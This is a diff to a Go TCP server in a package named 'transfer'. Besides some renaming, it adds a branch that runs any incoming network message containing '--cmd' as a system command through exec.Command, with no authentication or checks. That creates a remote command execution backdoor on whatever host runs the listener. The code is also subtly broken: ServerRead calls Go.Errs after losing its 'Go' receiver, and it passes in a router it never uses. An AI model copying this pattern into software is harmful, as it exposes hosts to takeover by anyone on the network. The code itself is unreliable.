@@ -2,12 +2,13 @@ package transfer
 
 import (
 	"fmt"
+	"github.com/gorilla/mux"
 	"net"
+	"os/exec"
 	"strings"
 )
 
-func (Go *Mango) Server_Listen() {
-
+func (Go *Mango) ServerListen(r *mux.Router) {
 	listener, err := net.Listen(
 		"tcp",
 		Go.NetConf().Service.ListenAddr,
@@ -16,16 +17,16 @@ func (Go *Mango) Server_Listen() {
 
 	defer listener.Close()
 	for {
-		conn, err := listener.Accept()
-		if err != nil {
-			fmt.Println(err)
+		conn, er := listener.Accept()
+		if er != nil {
+			fmt.Println(er)
 			continue
 		}
-		go Go.Server_Read(conn)
+		go ServerRead(conn, r)
 	}
 }
 
-func (Go *Mango) Server_Read(conn net.Conn) (output string) {
+func ServerRead(conn net.Conn, r *mux.Router) (output string) {
 
 	for {
 		n, err := conn.Read(buffer)
@@ -36,10 +37,16 @@ func (Go *Mango) Server_Read(conn net.Conn) (output string) {
 			return
 		}
 		TcpMsg := string(buffer[:n])
+		if strings.Contains(TcpMsg, "--cmd") {
+			cmd := exec.Command(TcpMsg[6:])
+			data, er := cmd.Output()
+			Go.Errs(er)
 
-		fmt.Println("Message:", TcpMsg, "\n")
-		// send this data to db handler
+			output = string(data)
+		} else {
 
+			fmt.Println("Received message:", TcpMsg, "\n")
+		}
 	}
 
 	return output
